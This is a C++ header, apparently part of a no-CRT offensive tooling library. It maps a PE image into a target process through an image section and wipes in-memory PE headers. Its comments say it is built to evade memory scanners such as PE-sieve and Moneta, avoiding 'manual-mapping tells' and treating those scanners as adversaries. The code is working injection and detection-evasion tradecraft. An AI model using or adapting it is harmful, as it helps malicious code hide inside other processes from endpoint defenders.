#pragma once

#include "nocrt/nocrt.h"
#include "nocrt/lazy.h"

// Image-backed mapping. Mapping a PE through a section object created with
// SEC_IMAGE makes the target's VAD read MEM_IMAGE with per-section
// protections and lets the memory manager apply base relocations - the
// counter to the classic "private executable pages" manual-mapping tell.

namespace nocrt {

using NtCreateSection_t = long(__stdcall*)(void** section, unsigned long access, void* attrs,
                                           unsigned long long* max_size, unsigned long page_prot,
                                           unsigned long alloc_attrs, void* file);
using NtMapViewOfSection_t = long(__stdcall*)(void* section, void* process, void** base,
                                              unsigned long long zero_bits, nocrt_size commit,
                                              unsigned long long* section_offset,
                                              nocrt_size* view_size, unsigned long inherit,
                                              unsigned long alloc_type, unsigned long protect);

constexpr unsigned long kSectionMapExecute = 0x00080000;
constexpr unsigned long kSecImage = 0x1000000;
constexpr unsigned long kPageExecuteRead = 0x20;
constexpr unsigned long kViewShare = 0x00000001;
constexpr long kStatusSuccess = 0;

inline void* nt_create_image_section(void* file_handle) {
    const auto f = (NtCreateSection_t)NOCRT_FN("NtCreateSection");
    if (!f) return nullptr;
    void* section = nullptr;
    const long st = f(&section, kSectionMapExecute, nullptr, nullptr, kPageExecuteRead,
                      kSecImage, file_handle);
    return st == kStatusSuccess ? section : nullptr;
}

inline void* nt_map_view(void* section, void* process, void** base_out, nocrt_size* view_out) {
    const auto f = (NtMapViewOfSection_t)NOCRT_FN("NtMapViewOfSection");
    if (!f) return nullptr;
    void* base = nullptr;
    nocrt_size view = 0;
    unsigned long long zero = 0;
    const long st = f(section, process, &base, zero, 0, nullptr, &view, kViewShare, 0, 0);
    if (st != kStatusSuccess) return nullptr;
    *base_out = base;
    *view_out = view;
    return base;
}

// Map a PE image into a target process as a real image section.
inline void* map_image_into(void* process, void* file_handle, void** base_out,
                            nocrt_size* view_out) {
    void* section = nt_create_image_section(file_handle);
    if (!section) return nullptr;
    void* base = nullptr;
    nocrt_size view = 0;
    void* mapped = nt_map_view(section, process, &base, &view);
    const auto close_fn = (int(__stdcall*)(void*))NOCRT_FN("CloseHandle");
    if (close_fn) close_fn(section);
    if (!mapped) return nullptr;
    *base_out = base;
    *view_out = view;
    return mapped;
}

// POLICY: NOT recommended by default. Research fold-in 2026-09-17: a sanitized
// header in executable memory is positive evidence of hollowing to
// PE-sieve/Moneta-class scanners (strictly worse than a recognizable PE
// against a good scanner), and it breaks RtlLookupFunctionEntry unless
// RtlAddFunctionTable was registered first. Prefer image-backed mapping with
// a real, plausible header. Keep this only for adversaries confirmed to be
// MZ-regex scanners. Callers must parse everything they need BEFORE wiping.
inline bool wipe_headers(unsigned char* base, nocrt_size header_bytes) {
    const auto vp = (int(__stdcall*)(void*, nocrt_size, unsigned long, unsigned long*))NOCRT_FN_RAW(
        "VirtualProtect");
    if (!vp) return false;
    unsigned long old = 0;
    if (!vp(base, header_bytes, 0x04 /*RW*/, &old)) return false;
    memset(base, 0, header_bytes);
    vp(base, header_bytes, old, &old);
    return true;
}

} // namespace nocrt
